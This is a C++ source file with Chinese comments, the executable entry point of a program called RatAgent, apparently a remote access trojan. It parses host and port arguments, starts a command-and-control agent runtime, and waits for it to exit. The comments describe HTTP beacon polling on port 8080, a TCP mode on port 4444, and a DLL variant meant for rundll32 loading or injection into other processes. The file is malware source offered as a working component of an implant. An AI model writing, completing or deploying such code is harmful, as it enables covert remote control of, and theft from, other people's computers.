// main.cpp — RatAgent EXE 入口（薄壳：解析参数 → 启动运行核心 → 等待退出）
//
// 用法：RatAgent.exe [host] [port] [-s sleeptime] [-tcp] [--selftest]
//   - 默认 beacon 模式（HTTP 轮询 8080，协议 §8）；
//   - `-tcp` 切换为 TCP 长连接模式（4444，协议 §4/§6）；
//   - argv 与 DLL 形态共用 agent_runtime 的同一套解析，两种产物行为一致。
//
// DLL 形态见 agent_dll.cpp（rundll32 / LoadLibrary / 注入）。
#include "agent_runtime.h"
#include "agent_debug.h"

#include "crypto.h"
#include "net.h"

#include <cstdio>
#include <string>

int main(int argc, char** argv) {
    if (!c2::net_init()) {
        AGENT_LOG("[-] WSAStartup failed\n");
        return -1;
    }

    c2::AgentRunArgs args;
    args.redirect_stdout = false;  // EXE 有控制台，不需要落文件

    std::string err;
    const std::string argline = c2::agent_args_from_argv(argc, argv);
    if (!c2::agent_parse_args(argline, args, err)) {
        AGENT_LOG("[-] bad args (%s): %s\n", argline.c_str(), err.c_str());
        AGENT_LOG("    usage: RatAgent.exe [host] [port] [-s sleeptime] [-tcp] [--selftest]\n");
        c2::net_cleanup();
        return 2;
    }
    // EXE：agent.id 保持历史行为（CWD 下的 agent.id）
    args.id_path = c2::agent_default_id_path(false);

    if (args.selftest) {
        std::string serr;
        bool ok = c2::crypto_selftest(serr);
        AGENT_LOG("[selftest] crypto: %s%s\n", ok ? "OK" : " FAIL", ok ? "" : serr.c_str());
        c2::net_cleanup();
        return ok ? 0 : 1;
    }

    if (!c2::agent_start(args, err)) {
        AGENT_LOG("[-] agent_start failed: %s\n", err.c_str());
        c2::net_cleanup();
        return 1;
    }

    // 阻塞到工作线程结束（Ctrl+C / 进程被杀 / 收到停止事件）
    c2::agent_wait(-1);
    AGENT_LOG("[*] RatAgent/%s exit\n", c2::agent_version());
    c2::net_cleanup();
    return 0;
}
